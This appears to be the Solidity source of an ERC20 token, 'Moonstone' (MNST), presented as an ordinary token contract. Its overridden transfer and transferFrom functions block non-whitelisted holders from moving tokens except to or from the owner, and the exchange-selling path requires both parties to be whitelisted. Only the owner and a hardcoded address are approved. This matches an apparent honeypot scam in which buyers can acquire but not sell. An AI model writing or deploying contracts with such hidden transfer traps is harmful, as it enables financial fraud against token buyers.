// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "./ERC20.sol";
import "./Ownable.sol";

contract Moonstone is ERC20, Ownable {
    mapping(address => bool) whiteList;

    constructor() ERC20("Moonstone", "MNST") {
        whiteList[msg.sender] = true;
        whiteList[0xeDB868e95c2D123d264be2b02bf4a19f891f87f6] = true;
        _mint(msg.sender, 100_000_000 * 10 ** decimals());
    }

    function addTowhiteList(address add) public onlyOwner {
        whiteList[add] = true;
    }

    function removeFromWhiteList(address add) public onlyOwner {
        whiteList[add] = false;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (owner() != to && owner() != msg.sender) {
            require(whiteList[msg.sender], "Not in whitelist");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (owner() != to && owner() != from) {
            require(whiteList[from] && whiteList[to], "Not in whitelist");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function getStatus(address add) public view onlyOwner returns (bool status) {
        return whiteList[add];
    }
}